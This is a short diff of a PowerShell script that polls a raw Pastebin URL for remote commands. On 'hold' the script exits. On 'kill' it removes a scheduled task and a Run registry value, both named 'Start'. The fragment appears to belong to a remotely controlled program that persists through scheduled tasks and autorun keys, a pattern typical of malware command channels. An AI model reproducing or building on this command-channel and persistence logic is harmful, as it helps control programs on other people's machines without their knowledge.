@@ -1,10 +1,10 @@
 $re = (IWR "https://pastebin.com/raw/Wy2fMXaw")
 
-if ($re.Content -match 'hold') {
+if ($re -match 'hold') {
     Exit
 }
 
-if ($re.Content -match 'kill') {
+if ($re -match 'kill') {
     schtasks /Delete /TN "Start" /f
     reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /f
     Exit
